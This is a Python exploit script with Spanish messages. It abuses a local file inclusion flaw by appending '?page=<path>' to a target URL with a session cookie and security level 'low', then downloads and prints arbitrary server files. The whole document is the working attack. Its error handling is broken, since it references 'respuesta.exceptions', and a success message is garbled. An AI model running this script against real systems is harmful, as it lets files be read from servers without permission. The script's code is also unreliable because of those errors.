import requests
import sys 

def exploit_lfi(url, path, cookies=None):
    header = {}
    if cookies:
        header["Cookie"] = cookies
    descargar = f"?page={path}"
    if "?page=" in url:
        url = url.split("?page=")[0]
    
    target = url + descargar
    print("URL de destino:", target)

    try:
        respuesta = requests.get(target, cookies=cookies)
    except respuesta.exceptions.RequestException as e:
        print(f"Error en la solicitud: {e}")
        sys.exit(1)

    if respuesta.status_code == 200:
        
        content = respuesta.text.split("<!DOCTYPE")[0]
        with open("Respuesta.txt", 'w') as f:
            f.write(content)  
            print("Descargado con Ã©xito")
            print("\nContenido:")
            print(content)
    else:
        print("Exploit no ha logrado su objetivo")

if len(sys.argv) != 4:
    print("Tienes que poner la url, el path que quieres descargar y las cookies")
    sys.exit(1)

url = sys.argv[1]
path = sys.argv[2]
cookie = sys.argv[3]
cookies = {"PHPSESSID" : cookie, "security": "low"}

exploit_lfi(url, path, cookies)
